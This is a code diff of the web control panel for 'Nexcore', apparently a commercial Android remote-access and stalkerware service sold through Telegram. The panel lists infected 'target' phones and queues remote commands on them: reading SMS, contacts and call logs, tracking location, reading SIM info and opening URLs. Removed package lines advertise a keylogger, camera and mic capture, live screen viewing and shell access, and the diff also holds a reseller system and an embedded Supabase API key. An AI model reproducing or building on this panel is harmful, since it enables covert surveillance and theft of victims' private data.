+  SUPABASE_ANON: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inhscmd3and5ZGJxc3lleGVtamxvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI4MDA0NzcsImV4cCI6MjA3ODM3NjQ3N30.xG6tcmHK3YV_4CYKmE7ELjLpc8GVvHKtc45t1U3yl8A',
 };
 const TG_URL = 'https://t.me/KingzsMe';
 
-/* ==================== STATE ==================== */
 const S = {
   token: localStorage.getItem('nx_token'),
   user:  localStorage.getItem('nx_user'),
@@ -398,16 +592,8 @@ const S = {
 };
 const isLoggedIn = () => !!S.token && S.expiry > Date.now();
 const isReseller = () => S.role === 'reseller' || S.role === 'admin';
-const NAV_SCREENS = ['dash','build','reseller','profile'];
+const NAV_SCREENS = ['dash','devices','build','reseller','profile'];
 
-const PACKAGES = [
-  { id:'basic', name:'Basic', price:25000, durationDays:7, features:['Akses 1 device','SMS & Contacts','Call Logs','Location'] },
-  { id:'pro', name:'Pro', price:75000, durationDays:30, badge:'POPULER', popular:true, features:['Akses 5 device','Semua fitur basic','Camera & Mic','Keylogger','Screen Live'] },
-  { id:'elite', name:'Elite', price:250000, durationDays:90, badge:'BEST', features:['Unlimited device','Semua fitur pro','Shell access','Priority support'] },
-  { id:'reseller', name:'Reseller', price:750000, durationDays:365, badge:'RESELLER', features:['Generate akun unlimited','Sub-reseller','Priority support'] },
-];
-
-/* ==================== NAV ==================== */
 function go(name){
   document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
   const el = document.getElementById('screen-' + name);
@@ -438,12 +624,10 @@ function toTelegram(){
   toast('Mengarahkan ke Telegram...', 'ok');
 }
 
-/* ==================== TOAST / MODAL ==================== */
 let toastTO;
 function toast(m, t=''){
   const el = document.getElementById('toast');
-  el.textContent = m;
-  el.className = 'toast show ' + t;
+  el.textContent = m; el.className = 'toast show ' + t;
   clearTimeout(toastTO);
   toastTO = setTimeout(() => el.className = 'toast ' + t, 2400);
 }
@@ -459,64 +643,35 @@ function closeModal(){ document.getElementById('modal').classList.remove('show')
 document.getElementById('modalOk').onclick = () => { if(modalCb) modalCb(); closeModal(); };
 document.getElementById('modal').onclick = e => { if(e.target.id === 'modal') closeModal(); };
 
-/* ==================== SUPABASE REST ==================== */
 async function supaGet(path){
   const r = await fetch(CONFIG.SUPABASE_URL + '/rest/v1' + path, {
-    headers: {
-      'apikey': CONFIG.SUPABASE_ANON,
-      'Authorization': 'Bearer ' + CONFIG.SUPABASE_ANON,
-      'Content-Type': 'application/json',
-    }
+    headers: { 'apikey': CONFIG.SUPABASE_ANON, 'Authorization': 'Bearer ' + CONFIG.SUPABASE_ANON, 'Content-Type': 'application/json' }
   });
   const j = await r.json().catch(() => null);
   if(!r.ok) throw new Error(j?.message || ('HTTP ' + r.status));
   return j;
 }
-async function supaPost(path, body, prefer='return=representation'){
+async function supaPost(path, body){
   const r = await fetch(CONFIG.SUPABASE_URL + '/rest/v1' + path, {
     method: 'POST',
-    headers: {
-      'apikey': CONFIG.SUPABASE_ANON,
-      'Authorization': 'Bearer ' + CONFIG.SUPABASE_ANON,
-      'Content-Type': 'application/json',
-      'Prefer': prefer,
-    },
-    body: JSON.stringify(body),
+    headers: { 'apikey': CONFIG.SUPABASE_ANON, 'Authorization': 'Bearer ' + CONFIG.SUPABASE_ANON, 'Content-Type': 'application/json', 'Prefer': 'return=representation' },
+    body: JSON.stringify(body)
   });
   const j = await r.json().catch(() => null);
   if(!r.ok) throw new Error(j?.message || ('HTTP ' + r.status));
   return j;
-}
-async function supaPatch(path, body){
-  const r = await fetch(CONFIG.SUPABASE_URL + '/rest/v1' + path, {
-    method: 'PATCH',
-    headers: {
-      'apikey': CONFIG.SUPABASE_ANON,
-      'Authorization': 'Bearer ' + CONFIG.SUPABASE_ANON,
-      'Content-Type': 'application/json',
-      'Prefer': 'return=minimal',
-    },
-    body: JSON.stringify(body),
-  });
-  if(!r.ok){ const j = await r.json().catch(()=>null); throw new Error(j?.message || ('HTTP '+r.status)); }
-  return true;
 }
 async function supaRpc(fn, args){
   const r = await fetch(CONFIG.SUPABASE_URL + '/rest/v1/rpc/' + fn, {
     method: 'POST',
-    headers: {
-      'apikey': CONFIG.SUPABASE_ANON,
-      'Authorization': 'Bearer ' + CONFIG.SUPABASE_ANON,
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(args),
+    headers: { 'apikey': CONFIG.SUPABASE_ANON, 'Authorization': 'Bearer ' + CONFIG.SUPABASE_ANON, 'Content-Type': 'application/json' },
+    body: JSON.stringify(args)
   });
   const j = await r.json().catch(() => null);
   if(!r.ok) throw new Error(j?.message || ('HTTP ' + r.status));
   return j;
 }
 
-/* ==================== LOGIN ==================== */
 async function doLogin(){
   const u = document.getElementById('loginUser').value.trim();
   const p = document.getElementById('loginPass').value;
@@ -528,22 +683,16 @@ async function doLogin(){
     const res = await supaRpc('nx_login', { p_username: u, p_password: p });
     if(!res.success) throw new Error(res.message || 'Login gagal');
     S.token = btoa(JSON.stringify(res.data));
-    S.user = res.data.username;
-    S.role = res.data.role;
-    S.uid = res.data.id;
+    S.user = res.data.username; S.role = res.data.role; S.uid = res.data.id;
     S.expiry = Date.now() + 30*24*60*60*1000;
-    localStorage.setItem('nx_token', S.token);
-    localStorage.setItem('nx_user', S.user);
-    localStorage.setItem('nx_role', S.role);
-    localStorage.setItem('nx_uid', S.uid);
-    localStorage.setItem('nx_exp', S.expiry);
+    ['nx_token','nx_user','nx_role','nx_uid','nx_exp'].forEach((k,i) => {
+      localStorage.setItem(k, [S.token,S.user,S.role,S.uid,S.expiry][i]);
+    });
     toast('Login berhasil','ok');
     setTimeout(() => go('dash'), 300);
   }catch(e){
     toast('Error: ' + e.message, 'err');
-  }finally{
-    btn.disabled = false; btn.textContent = old;
-  }
+  }finally{ btn.disabled = false; btn.textContent = old; }
 }
 function doLogout(){
   openModal('Logout', 'Yakin keluar dari Nexcore?', 'LOGOUT', () => {
@@ -555,29 +704,9 @@ function doLogout(){
   });
 }
 
-/* ==================== DASHBOARD ==================== */
-const MENUS = [
-  { action:'devices', label:'Devices', icon:'📱' },
-  { action:'sms', label:'SMS', icon:'💬', premium:true },
-  { action:'contacts', label:'Contacts', icon:'👥', premium:true },
-  { action:'calls', label:'Call Logs', icon:'📞', premium:true },
-  { action:'camera', label:'Camera', icon:'📷', premium:true },
-  { action:'mic', label:'Mic', icon:'🎤', premium:true },
-  { action:'location', label:'Location', icon:'📍', premium:true },
-  { action:'apps', label:'Apps', icon:'📦' },
-  { action:'reseller', label:'Reseller', icon:'💎', premium:true },
-  { action:'logout', label:'Logout', icon:'🚪' },
-];
 function initDash(){
   document.getElementById('dashUser').textContent = S.user || '-';
   document.getElementById('dashRole').textContent = (S.role||'user').toUpperCase();
-  const grid = document.getElementById('menuGrid');
-  grid.innerHTML = MENUS.map((m,i) => `
-    <div class="tile" style="animation-delay:${i*0.025}s" onclick="menuClick('${m.action}','${m.label}')">
-      ${m.premium ? '<div class="prem">PREMIUM</div>' : ''}
-      <div class="icon">${m.icon}</div>
-      <div class="name">${m.label}</div>
-    </div>`).join('');
   loadDevicesCount();
 }
 async function loadDevicesCount(){
@@ -587,18 +716,7 @@ async function loadDevicesCount(){
     document.getElementById('dashOn').textContent = list.filter(d=>d.online).length;
   }catch(e){ document.getElementById('dashDev').textContent = '?'; }
 }
-function menuClick(action, label){
-  if(action === 'logout'){ doLogout(); return; }
-  if(action === 'reseller'){
-    if(!isReseller()){ toast('Khusus premium reseller','err'); return; }
-    go('reseller'); return;
-  }
-  if(action === 'devices'){ go('devices'); return; }
-  toast('Pilih device dulu di menu Devices', 'err');
-  go('devices');
-}
 
-/* ==================== DEVICES ==================== */
 async function initDevices(){
   const box = document.getElementById('devList');
   const cnt = document.getElementById('devCount');
@@ -607,19 +725,22 @@ async function initDevices(){
     const list = await supaGet('/nx_devices?select=*&order=last_seen.desc');
     cnt.textContent = `${list.length} device · ${list.filter(d=>d.online).length} online`;
     if(!list.length){
-      box.innerHTML = '<div class="log">Belum ada device terhubung. Install APK Nexcore di HP target.</div>';
+      box.innerHTML = '<div class="log">Belum ada device terhubung.<br><br>Install APK Nexcore di HP target dulu.</div>';
       return;
     }
-    box.innerHTML = list.map(d => `
-      <div class="acct-card" onclick='openDevice(${JSON.stringify(d)})' style="cursor:pointer">
-        <div class="ac-info">
-          <div style="font-size:14px;font-weight:800;margin-bottom:4px">${d.model || 'Unknown'}</div>
-          <div style="font-size:11px;color:var(--text2)">${d.online ? '🟢 Online' : '⚫ Offline'} · 🤖 ${d.android_version||'?'} · 🔋 ${d.battery ?? '?'}%</div>
-          <div style="font-size:10px;color:var(--text2);margin-top:2px;font-family:'JetBrains Mono'">${d.id}</div>
+    box.innerHTML = list.map((d,i) => `
+      <div class="dev-item" style="animation-delay:${i*0.03}s" onclick='openDevice(${JSON.stringify(d).replace(/'/g,"&#39;")})'>
+        <div class="di-icon">📱<span class="di-dot ${d.online?'on':''}"></span></div>
+        <div class="di-info">
+          <div class="di-model">${d.model || 'Unknown'}</div>
+          <div class="di-meta">
+            <span>🤖 ${d.android_version||'?'}</span>
+            <span>🔋 ${d.battery ?? '?'}%</span>
+            <span>${d.online ? '🟢 Online' : '⚫ Offline'}</span>
+          </div>
         </div>
-        <div style="font-size:22px;color:var(--text2)">›</div>
-      </div>
-    `).join('');
+        <div class="di-arrow">›</div>
+      </div>`).join('');
   }catch(e){
     box.innerHTML = `<div class="log err">Gagal: ${e.message}</div>`;
     cnt.textContent = 'Error';
@@ -629,41 +750,21 @@ async function initDevices(){
 let CURRENT_DEVICE = null;
 function openDevice(d){
   CURRENT_DEVICE = d;
-  document.getElementById('dvTitle').textContent = 'DEVICE';
   document.getElementById('dvModel').textContent = d.model || 'Unknown';
-  document.getElementById('dvMeta').innerHTML = `🤖 Android ${d.android_version||'?'} · 🔋 ${d.battery ?? '?'}% · ${d.online ? '🟢 Online' : '⚫ Offline'}<br><span style="font-family:'JetBrains Mono';font-size:10px">${d.id}</span>`;
+  document.getElementById('dvSub').innerHTML = `<span>🟢 ${d.online ? 'Online' : 'Offline'}</span><span>🤖 Android ${d.android_version||'?'}</span>`;
+  document.getElementById('dvDot').className = 'dot' + (d.online ? ' on' : '');
+  document.getElementById('dvIp').textContent = d.ip || '—';
+  document.getElementById('dvAndroid').textContent = d.android_version || '—';
+  document.getElementById('dvBattery').textContent = (d.battery ?? '—') + '%';
+  document.getElementById('dvLast').textContent = d.last_seen ? new Date(d.last_seen).toLocaleString('id-ID') : '—';
+  document.getElementById('dvId').textContent = d.id;
   document.getElementById('dvOutput').textContent = 'Ready. Pilih aksi di atas.';
   document.getElementById('dvCustom').value = '';
   document.getElementById('dvArgs').value = '';
-  renderCtrlList();
   go('device');
 }
 function refreshDevice(){ if(CURRENT_DEVICE) openDevice(CURRENT_DEVICE); }
 
-const CTRL_LIST = [
-  { cmd:'battery', icon:'🔋', name:'Battery' },
-  { cmd:'device_info', icon:'ℹ️', name:'Info Device' },
-  { cmd:'sms', icon:'💬', name:'Baca SMS' },
-  { cmd:'contacts', icon:'👥', name:'Kontak' },
-  { cmd:'calls', icon:'📞', name:'Call Logs' },
-  { cmd:'apps', icon:'📦', name:'Apps' },
-  { cmd:'location', icon:'📍', name:'Lokasi' },
-  { cmd:'sim', icon:'📡', name:'Info SIM' },
-  { cmd:'vibrate', icon:'📳', name:'Vibrate' },
-  { cmd:'toast', icon:'💭', name:'Popup Pesan' },
-  { cmd:'open_url', icon:'🔗', name:'Buka URL' },
-];
-function renderCtrlList(){
-  const box = document.getElementById('ctrlList');
-  box.innerHTML = CTRL_LIST.map(c => `
-    <div class="acct-card" style="cursor:pointer" onclick="dvCmd('${c.cmd}')">
-      <div class="ac-info">
-        <div class="ac-row"><span style="font-size:18px">${c.icon}</span><span style="font-weight:800;font-family:'Inter';font-size:13px;color:var(--text)">${c.name}</span></div>
-      </div>
-      <div style="font-size:20px;color:var(--text2)">›</div>
-    </div>
-  `).join('');
-}
 async function dvCmd(cmd){
   if(!CURRENT_DEVICE){ toast('Device tidak ada','err'); return; }
   await runCmd(cmd, '');
@@ -688,7 +789,6 @@ async function runCmd(cmd, args){
     });
     const cmdId = inserted[0]?.id;
     log.textContent += `[${t}] ✓ Queue: ${cmdId}\n[${t}] Menunggu device...`;
-    // Poll status 20 detik
     for(let i=0;i<20;i++){
       await new Promise(r => setTimeout(r, 1000));
       const res = await supaGet(`/nx_commands?id=eq.${cmdId}&select=*`);
@@ -704,7 +804,6 @@ async function runCmd(cmd, args){
   }
 }
 
-/* ==================== RESELLER ==================== */
 async function initReseller(){
   try{
     const list = await supaGet('/nx_generated_accounts?select=id,used');
@@ -718,10 +817,7 @@ let generatedAccounts = [];
 function renderAccounts(list){
   generatedAccounts = list || [];
   const box = document.getElementById('acctList');
-  if(!generatedAccounts.length){
-    box.innerHTML = '<div class="log">Belum ada akun.</div>';
-    return;
-  }
+  if(!generatedAccounts.length){ box.innerHTML = '<div class="log">Belum ada akun.</div>'; return; }
   box.innerHTML = generatedAccounts.map((a,i) => `
     <div class="acct-card">
       <div class="ac-info">
@@ -730,8 +826,7 @@ function renderAccounts(list){
         <div class="ac-row"><span class="ac-k">Plan</span><span style="color:var(--text2);font-size:10px;text-transform:uppercase">${a.plan}</span></div>
       </div>
       <button class="ac-copy" onclick='copyAcct(${i})'>📋</button>
-    </div>
-  `).join('');
+    </div>`).join('');
 }
 async function genAccount(){
   const plan = document.getElementById('rsPlan').value;
@@ -756,9 +851,8 @@ async function genAccount(){
     }
     toast(`${qty} akun dibuat`, 'ok');
     initReseller();
-  }catch(e){
-    toast('Error: ' + e.message, 'err');
-  }finally{ btn.disabled = false; btn.textContent = old; }
+  }catch(e){ toast('Error: ' + e.message, 'err'); }
+  finally{ btn.disabled = false; btn.textContent = old; }
 }
 function copyAcct(i){
   const a = generatedAccounts[i];
@@ -780,7 +874,6 @@ function copyText(t){
   });
 }
 
-/* ==================== PROFILE ==================== */
 function initProfile(){
   document.getElementById('pfUser').textContent = S.user || '-';
   document.getElementById('pfRole').textContent = (S.role||'user').toUpperCase();
@@ -788,7 +881,6 @@ function initProfile(){
   document.getElementById('pfRole2').textContent = (S.role||'user').toUpperCase();
 }
 
-/* ==================== BOOT ==================== */
 window.addEventListener('load', () => {
   setTimeout(() => {
     document.getElementById('splash').classList.add('hide');
